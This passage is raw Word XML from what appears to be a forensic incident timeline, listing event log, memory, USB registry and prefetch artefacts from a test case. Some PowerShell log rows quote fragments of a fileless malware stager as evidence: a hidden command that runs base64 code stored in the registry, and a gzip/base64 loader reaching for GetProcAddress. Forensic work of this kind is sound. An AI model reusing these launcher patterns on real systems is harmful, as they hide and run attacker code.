            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-010, F-019, I-007, I-016, I-017, T-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.797308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 400 | PowerShell | Engine state is changed from None to Available | HostApplication=powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=ConsoleHost</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=5.1.19041.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:42.966250</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;amp;([scriptblock]::create((New-Object </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15076</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, psscan)</w:t>
              <w:br/>
              <w:t>powershell.exe</w:t>
              <w:br/>
              <w:t>PID=3316 | PPID=508 | ImageFileName=powershell.exe | SessionId=2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, T-010, T-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process list (pslist)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, pslist)</w:t>
              <w:br/>
              <w:t>powershell.exe</w:t>
              <w:br/>
              <w:t>PID=3316 | PPID=508 | ImageFileName=powershell.exe | SessionId=2 | Threads=11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.pslist.PsList.jsonl#81</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:44.088879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: &amp;amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAHNwZV8CA7VWe2+bSBD/O5HyHVBlCVAcG7tOm4tU6RYMMT47NcWv2LUqDGvYenkUltik1+9+szak6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:44.732435</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: function pLBA {, Param ($kuL, $fc), $wk = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods'), return $wk.GetMethod('GetProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15081</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, T-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.344277</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USB: last connected</w:t>
              <w:br/>
              <w:t xml:space="preserve">USB Mass Storage Device serial=4C530000261130109435 Cruzer Glide 3.0 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_USB.csv#4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002, F-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.406346</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USBSTOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USBSTOR: key written ; USBSTOR: installed ; USBSTOR: first installed (property 0064) ; USBSTOR: last connected (property 0066)</w:t>
              <w:br/>
              <w:t>Ven_SanDisk Prod_Cruzer_Glide_3.0 Rev_1.00 serial=4C530000261130109435&amp;0 SanDisk Cruzer Glide 3.0 USB Device  disk={ce43e459-fa16-11ea-95ef-000c2914c295}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_USBSTOR.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002, T-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.625064</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: VolumeInfoCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volume seen (VolumeInfoCache)</w:t>
              <w:br/>
              <w:t>DriveName=E: | VolumeLabel=Incident_drive | DriveType=Fixed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_VolumeInfoCache.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:59.765675</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: portable devices (WPD)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Portable device: key written</w:t>
              <w:br/>
              <w:t>Incident_drive DISK&amp;VEN_SANDISK&amp;PROD_CRUZER_GLIDE_3.0&amp;REV_1.00 serial=4C530000261130109435&amp;0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_WindowsPortableDevices.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:09.150531</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>SNIPPINGTOOL.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=B23F9DB3 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#141</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\SNIPPINGTOOL.EXE-B23F9DB3.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:13.183384</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>MSINFO32.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=C3C668DA False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\MSINFO32.EXE-C3C668DA.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56.191578</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>FTK IMAGER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=E67CC266 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#54</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\FTK IMAGER.EXE-E67CC266.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002, T-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56.191578</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
